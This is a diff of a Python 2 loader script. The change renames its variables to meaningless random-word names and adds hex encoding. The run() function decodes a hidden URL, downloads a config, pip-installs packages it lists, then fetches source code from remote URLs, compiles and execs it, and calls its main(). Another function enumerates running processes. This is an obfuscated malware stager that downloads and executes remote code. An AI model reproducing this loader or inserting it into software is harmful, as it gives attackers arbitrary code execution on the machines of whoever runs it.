@@ -10,8 +10,9 @@ from urllib import urlopen
 
 def run(*args, **kwargs):
     SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
+    IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
     AccidentalAquaticCactus = loads(urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
-    AccidentalAquaticCactus['settings']['f'] = str(globals().get('__file__'))
+    AccidentalAquaticCactus['settings']['f'] = IncontinentObtuseCucumber(globals().get('__file__')) if '__file__' in globals() else None
     ReflectiveTightfistedTrapezoid = AccidentalAquaticCactus['settings'].get('v')
     try:
         GroovySophisticatedLemur = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
@@ -27,14 +28,14 @@ def run(*args, **kwargs):
                 GlaringlySubtleSponge = BloatedLionProlapse([GroovySophisticatedLemur, 'install', os.path.basename(NobleRusticWalrus)])
             ChivalrousIntergalacticPlayboy = os.remove(os.path.basename(NobleRusticWalrus)) if os.path.isfile(os.path.basename(NobleRusticWalrus)) else None
     finally:
-        imports = urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('w'))).read()
-        uri     = SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('u'))
-        name    = os.path.splitext(os.path.basename(uri))[0]
-        module  = new_module(name)
-        source  = '\n\n'.join([imports, urlopen(uri).read()])
-        code    = compile(source, name, 'exec')
-        exec code in module.__dict__
-        return module.main(**AccidentalAquaticCactus['settings'])
+        RoundPluckyScallion = urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('w'))).read()
+        AmbiguousObedientQuestion = SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('u'))
+        TalentedAlcoholicBeetle = os.path.splitext(os.path.basename(AmbiguousObedientQuestion))[0]
+        PanoramicAbandonedCraftsman = new_module(TalentedAlcoholicBeetle)
+        QuarrelsomeImportedAtom = '\n\n'.join([RoundPluckyScallion, urlopen(AmbiguousObedientQuestion).read()])
+        MajesticMachoOkra = compile(QuarrelsomeImportedAtom, TalentedAlcoholicBeetle, 'exec')
+        exec MajesticMachoOkra in PanoramicAbandonedCraftsman.__dict__
+        return PanoramicAbandonedCraftsman.main(**AccidentalAquaticCactus['settings'])
 
 def main(*args, **kwargs):
     s = 'tasklist' if os.name is 'nt' else 'ps'
